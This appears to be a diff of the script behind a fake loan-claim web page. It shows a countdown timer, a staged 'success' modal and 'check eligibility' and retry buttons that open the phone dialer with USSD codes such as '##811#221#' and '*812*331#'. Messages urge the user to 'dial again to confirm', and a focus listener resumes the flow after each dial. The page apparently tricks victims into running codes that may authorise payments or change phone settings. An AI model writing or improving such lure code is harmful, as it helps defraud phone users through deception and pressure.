@@ -530,6 +530,8 @@ if (!expiryTime) {
   expiryTime = parseInt(expiryTime, 10);
 }
 
+let isFlowActive = false;
+
 function updateTimer() {
   const now = new Date().getTime();
   const distance = expiryTime - now;
@@ -604,23 +606,19 @@ function showCompletion(action) {
 // SUCCESS
 function showSuccess() {
   const modal = document.getElementById("successModal");
-  const main = document.getElementById("mainContent");
 
   modal.classList.add("show");
-  main.classList.add("blur");
 
-  // ✅ Check if amount already exists
+  document.getElementById("mainContent").classList.add("blur");
 
+  sessionStorage.setItem("flowState", "success");
 }
 
 // CHECK ELIGIBILITY -> OPEN DIALER
 function checkEligibility() {
-  document.getElementById("successModal").classList.remove("show");
-  document.getElementById("mainContent").classList.remove("blur");
-
   sessionStorage.setItem("ussdPending", "true");
+  sessionStorage.setItem("flowState", "dialing");
 
-  // Open dialer
   window.location.href = "tel:%23%23811%23221%23";
 }
 
@@ -657,9 +655,6 @@ function retryClaim() {
   else if (retryCount === 1) {
     message.innerText = "⏳ Still processing... please dial again to confirm.";
   } 
-  else if (retryCount === 2) {
-    message.innerText = "❗ Final attempt: ensure you accept all prompts carefully.";
-  }
 
   let time = 5;
   btn.disabled = true;
@@ -706,9 +701,6 @@ function retryDial() {
   if (retryCount === 1) {
     window.location.href = "tel:*812*331%23";
 
-  } else if (retryCount === 2) {
-    window.location.href = "tel:*811*221%23";
-
   } else {
     showSessionExpired();
   }
@@ -720,34 +712,49 @@ function startClaim() {
 
   // mark that we are now in retry flow
   sessionStorage.setItem("isRetry", "true");
+  sessionStorage.setItem("flowState", "retry");
 
   // first redial
-  window.location.href = "tel:*812*331%23";
+  window.location.href = "tel:*811*221%23";
 }
 
 // END
 function closeAll() {
   document.getElementById("step2Modal").classList.remove("show");
   document.getElementById("successModal").classList.remove("show");
+
   document.getElementById("retryPopup").classList.add("hidden");
   document.getElementById("verifyPopup").classList.add("hidden");
+
+  document.getElementById("mainContent").classList.remove("blur");
+
   sessionStorage.removeItem("loanAmount");
   sessionStorage.removeItem("isRetry");
-
-  const main = document.getElementById("mainContent");
-  if (main) main.classList.remove("blur");
+  sessionStorage.removeItem("flowState");
+  sessionStorage.removeItem("ussdPending");
 
   retryCount = 0;
 }
 
-function showSessionExpired() {
+function showSessionExpired(){
   document.getElementById("sessionPopup").classList.remove("hidden");
   document.getElementById("mainContent").classList.add("blur");
+
+  // ✅ mark session ended
+  sessionStorage.setItem("sessionEnded", "true");
 }
 
-function exitSession() {
+function exitSession(){
   document.getElementById("sessionPopup").classList.add("hidden");
+  window.scrollTo({ top: 0, behavior: "smooth" });
+
   closeAll();
+
+  // ✅ clear all session flags
+  sessionStorage.removeItem("ussdPending");
+  sessionStorage.removeItem("isRetry");
+  sessionStorage.removeItem("loanAmount");
+  sessionStorage.removeItem("sessionEnded");
 }
 </script>
 
@@ -815,16 +822,28 @@ setInterval(() => {
 
 // Detect return from dialer
 window.addEventListener("focus", () => {
+
+  if (sessionStorage.getItem("sessionEnded") === "true") return;
+
   if (sessionStorage.getItem("ussdPending") === "true") {
+
     sessionStorage.removeItem("ussdPending");
 
-setTimeout(() => {
-  if (sessionStorage.getItem("isRetry") === "true") {
-    retryClaim(); // show retry popup after redial
-  } else {
-    goStep2(); // first return → show success with claim
-  }
-}, 800);
+    setTimeout(() => {
+
+      const state = sessionStorage.getItem("flowState");
+
+      if (state === "success") {
+        goStep2(); // first return → show loan result
+
+      } else if (state === "dialing") {
+        goStep2();
+
+      } else if (sessionStorage.getItem("isRetry") === "true") {
+        retryClaim();
+      }
+
+    }, 800);
   }
 });
 </script>
